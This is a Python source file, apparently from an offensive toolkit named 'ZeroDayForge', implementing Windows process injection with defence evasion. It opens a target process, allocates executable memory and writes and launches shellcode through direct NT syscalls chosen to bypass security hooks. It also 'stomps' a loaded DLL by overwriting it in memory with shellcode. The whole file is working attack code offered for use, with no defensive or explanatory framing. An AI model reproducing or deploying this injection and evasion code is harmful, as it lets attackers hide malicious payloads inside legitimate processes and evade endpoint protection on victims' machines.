import ctypes
import logging
from ctypes import wintypes, byref
from core.syscall_hook.syscall_dispatch import SyscallDispatcher

class EvasionError(Exception):
	"""Custom exception for evasion failures"""
	pass

class InjectionEvasion:
	def __init__(self, pid):
		self.logger = logging.getLogger('ZeroDayForge.Evasion')
		self.pid = pid
		self.syscall = SyscallDispatcher()
		self.PROCESS_ALL_ACCESS = 0x1F0FFF

	def direct_syscall_inject(self, shellcode):
		"""Direct syscall injection with proper handles"""
		try:
			hProcess = self._open_process()
			addr = self._syscall_alloc(hProcess, len(shellcode))
			self._syscall_write(hProcess, addr, shellcode)
			self._syscall_create_thread(hProcess, addr)
			return True
		except Exception as e:
			self.logger.error(f"Syscall inject failed: {str(e)}")
			return False

	def _open_process(self):
		"""Get process handle with proper access"""
		hProcess = ctypes.windll.kernel32.OpenProcess(
			self.PROCESS_ALL_ACCESS, False, self.pid)
		if not hProcess:
			raise EvasionError(f"OpenProcess failed: {ctypes.GetLastError()}")
		return hProcess

	def _syscall_alloc(self, hProcess, size):
		"""Syscall memory allocation"""
		base_addr = ctypes.c_void_p()
		size_ct = ctypes.c_size_t(size)
		status = self.syscall.direct_syscall(
			'NtAllocateVirtualMemory',
			hProcess, byref(base_addr), 0, byref(size_ct),
			0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
		)
		if status != 0:
			raise EvasionError(f"Allocation failed: NTSTATUS 0x{status:x}")
		return base_addr.value

	def _syscall_write(self, hProcess, addr, shellcode):
		"""Syscall memory write"""
		written = wintypes.SIZE_T()
		status = self.syscall.direct_syscall(
			'NtWriteVirtualMemory',
			hProcess, addr, shellcode, len(shellcode), byref(written)
		)
		if status != 0:
			raise EvasionError(f"Write failed: NTSTATUS 0x{status:x}")

	def _syscall_create_thread(self, hProcess, addr):
		"""Syscall create remote thread"""
		hThread = ctypes.c_void_p()
		status = self.syscall.direct_syscall(
			'NtCreateThreadEx',
			byref(hThread), 0x1FFFFF, None, hProcess, addr, None, 0, 0, 0, 0
		)
		if status != 0:
			raise EvasionError(f"Thread creation failed: NTSTATUS 0x{status:x}")

	def module_stomping(self, legit_dll, shellcode):
		"""Overwrite existing DLL in memory"""
		try:
			base = ctypes.windll.kernel32.GetModuleHandleW(legit_dll)
			old_protect = wintypes.DWORD()
			
			if not ctypes.windll.kernel32.VirtualProtectEx(
				-1, base, len(shellcode), 0x40, byref(old_protect)
			):
				raise ctypes.WinError()
				
			written = wintypes.SIZE_T()
			if not ctypes.windll.kernel32.WriteProcessMemory(
				-1, base, shellcode, len(shellcode), byref(written)
			):
				raise ctypes.WinError()
				
			return base
		except Exception as e:
			self.logger.error(f"Module stomping failed: {str(e)}")
			raise EvasionError("Module stomping failed")